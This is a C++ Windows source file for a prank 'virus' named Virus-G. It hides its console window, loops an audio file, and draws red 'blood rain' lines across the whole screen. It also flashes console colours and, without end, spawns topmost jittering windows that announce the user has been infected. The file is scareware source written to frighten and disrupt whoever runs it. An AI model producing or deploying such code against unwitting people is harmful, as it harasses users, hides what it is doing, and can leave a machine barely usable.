#include <windows.h>
#include <mmsystem.h>
#include <thread>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "winmm.lib")  // Para reproducir audio

int screenWidth = GetSystemMetrics(SM_CXSCREEN);
int screenHeight = GetSystemMetrics(SM_CYSCREEN);


void playSound() {
    mciSendString("open virusg.mp3 type mpegvideo alias music", NULL, 0, NULL);
    mciSendString("play music repeat", NULL, 0, NULL);
}

void bloodRain() {
    HDC hdc = GetDC(NULL);
    HPEN hPen = CreatePen(PS_SOLID, 2, RGB(255, 0, 0));
    SelectObject(hdc, hPen);
    srand(time(0));

    while (true) {
        int x = rand() % screenWidth;
        int y1 = rand() % screenHeight;
        int y2 = y1 + (rand() % 100);

        MoveToEx(hdc, x, y1, NULL);
        LineTo(hdc, x, y2);
        Sleep(50);
    }
}

void flashScreen() {
    while (true) {
        system("color 04"); // Rojo y negro
        Sleep(500);
        system("color 07"); // Blanco y negro
        Sleep(500);
    }
}

void moveWindow(HWND hwnd) {
    srand(time(0));
    int x = rand() % (screenWidth - 300);
    int y = rand() % (screenHeight - 200);

    while (true) {
        x += (rand() % 11) - 5;
        y += (rand() % 11) - 5;
        SetWindowPos(hwnd, HWND_TOPMOST, x, y, 300, 200, SWP_SHOWWINDOW);
        Sleep(50);
    }
}

void createWindows() {
    while (true) {
        HWND hwnd = CreateWindow("STATIC", "Fuiste infectado por el Virus-G HAHAHAH!!!",
                                 WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                 CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
                                 NULL, NULL, NULL, NULL);
        std::thread(moveWindow, hwnd).detach();
        Sleep(3000);
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Ocultar consola
    std::thread(playSound).detach();
    std::thread(bloodRain).detach();
    std::thread(flashScreen).detach();
    createWindows();
    return 0;
}
